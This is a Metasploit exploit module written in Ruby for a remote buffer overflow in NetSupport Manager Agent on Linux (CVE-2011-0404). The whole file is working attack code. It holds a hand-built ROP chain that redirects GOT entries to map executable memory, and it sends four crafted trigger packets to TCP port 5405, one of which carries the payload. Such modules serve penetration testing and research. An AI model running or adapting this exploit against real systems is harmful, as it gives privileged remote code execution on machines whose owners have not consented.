##
# $Id: netsupport_manager_agent.rb 11868 2011-03-03 01:04:47Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'NetSupport Manager Agent Remote Buffer Overflow',
			'Description'    => %q{
					This module exploits a buffer overflow in NetSupport Manager Agent. It
				uses a similar ROP to the proftpd_iac exploit in order to avoid non executable stack.
			},
			'Author'         =>
				[
					'Luca Carettoni (@_ikki)',  # original discovery / exploit
					'Evan',  # ported from exploit-db exploit
					'jduck'  # original proftpd_iac ROP, minor cleanups
				],
			'Arch'           => ARCH_X86,
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11868 $',
			'References'     =>
				[
					[ 'CVE', '2011-0404' ],
					[ 'OSVDB', '70408' ],
					[ 'URL', 'http://www.exploit-db.com/exploits/15937/' ]
				],
			'Privileged'     => true,
			'Platform'       => 'linux',
			'Payload'        =>
				{
					'Space'    => 0x975,
					'BadChars' => "",
					'DisableNops'  => true,
				},
			'Targets'        =>
				[
					[ 'linux',
						{
							'Ret' => 0x0805e50c, # pop eax ; pop ebx ; pop ebp ;;
							'Pad' => 975,
							'RopStack' =>
								[
									### mmap isn't used in the binary so we need to resolve it in libc
									0x00041160, # mmap64 - localtime
									0xa9ae0e6c, # 0x8092b30 - 0x5e5b1cc4, localtime will become mprotect
									0xcccccccc,
									0x08084662, # add    DWORD PTR [ebx+0x5e5b1cc4],eax; pop edi; pop ebp ;;
									0xcccccccc,
									0xcccccccc,
									0x080541e4, # localtime@plt (now mmap64)
									0x080617e3, # add esp 0x10 ; pop ebx ; pop esi ; pop ebp ;;
									0, 0x20000, 0x7, 0x22, 0xffffffff, 0, # mmap64 arguments
									0x0, # unused
									0x08066332, # pop edx; pop ebx; pop ebp ;;
									"\x89\x1c\xa8\xc3".unpack('V').first, # mov [eax+ebp*4], ebx
									0xcccccccc,
									0xcccccccc,
									0x080555c4, # mov [eax] edx ; pop ebp ;;
									0xcccccccc,
									#0x0807385a, # push eax ; adc al 0x5d ;;

									### this is  the stub used to copy shellcode from the stack to
									### the newly mapped executable region
									#\x8D\xB4\x24\x7D\xFB\xFF      # lea esi,[dword esp-0x483]
									#\x8D\x78\x12                  # lea edi,[eax+0x12]
									#\x6A\x7F                      # push byte +0x7f
									#\x59                          # pop ecx
									#\xF3\xA5                      # rep movsd

									### there are no good jmp eax so  overwrite getrlimits GOT entry
									0x0805591b, # pop ebx; pop ebp ;;
									0x08092d68 - 0x4, # 08092d68  0002f007 R_386_JUMP_SLOT   00000000   getrlimit
									0x1,        # becomes ebp
									0x08084f38, # mov [ebx+0x4] eax ; pop ebx ; pop ebp ;;
									0xfb7c24b4, # become eb
									0x01,
									0x08054ac4, # <getrlimit@plt>
									0x0805591b, # pop ebx; pop ebp ;;
									#0xffff8d78, # become ebx
									0x788dffff,
									0x2,
									0x08054ac4, # <getrlimit@plt>
									0x0805591b, # pop ebx; pop ebp ;;
									0x597f6a12,
									0x3,
									0x08054ac4, # <getrlimit@plt>
									0x0805591b, # pop ebx; pop ebp ;;
									0x9090a5f2,
									0x4,
									0x08054ac4, # <getrlimit@plt>
									0x0805591b, # pop ebx; pop ebp ;;
									0x8d909090,
									0x0,
									0x08054ac4, # <getrlimit@plt>
									0xcccccccc,
									0x01010101,
								]
						}
					]
				],
			'DisclosureDate' => 'Feb 12 2010',
			'DefaultTarget' => 0))

		register_options(
			[
				Opt::RPORT(5405),
			], self.class)
	end

	def exploit
		connect

		#pop_eax_ebx ;
		#0x8084662 # add    DWORD PTR [ebx+0x5e5b1cc4],eax ;;
		triggerA = "\x15\x00\x5a\x00" + "\x41" * 1024 + "\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

		triggerB = "\x25\x00\x51\x00\x81\x41\x41\x41\x41\x41\x41\x00" +
			"\x41\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" +
			"\x00\x00\x00"

		triggerC = "\x37\x00\x03\x00\x0a\x00\x00\x00\x00\x00\x58\xb4" +
			"\x92\xff\x00\x00\x69\x6b\x6b\x69\x00\x57\x4f\x52" +
			"\x4b\x47\x52\x4f\x55\x50\x00\x3c\x3e" + #pleasure trail
			#"\xcc" +
			"\x90" +
			payload.encoded +
			"\xcc" * (target['Pad'] - payload.encoded.length) +
			[target.ret].pack('V')

		new = ''
		if target['RopStack']
			new << target['RopStack'].map { |e|
				if e == 0xcccccccc
					rand_text(4).unpack('V').first
				else
					e
				end
			}.pack('V*')
		end

		triggerC << new
		triggerC << "\x00" * 4
		triggerC << "\x00\x00\x31\x32\x2e\x36\x32\x2e\x31\x2e\x34\x32"
		triggerC << "\x30\x00\x31\x30\x00\x00"

		triggerD = "\x06\x00\x07\x00\x20\x00\x00\x00\x0e\x00\x32\x00" +
			"\x01\x10\x18\x00\x00\x01\x9f\x0d\x00\x00\xe0\x07" +
			"\x06\x00\x07\x00\x00\x00\x00\x00\x02\x00\x4e\x00" +
			"\x02\x00\xac\x00\x04\x00\x7f\x00\x00\x00"

		print_status("Sending A")
		sock.put(triggerA)
		select(nil, nil, nil, 1)

		print_status("Sending B")
		sock.put(triggerB)
		select(nil, nil, nil, 1)

		print_status("Sending C")
		sock.put(triggerC)
		select(nil, nil, nil, 1)

		print_status("Sending D")
		sock.put(triggerD)
		select(nil, nil, nil, 1)

		disconnect
	end
end
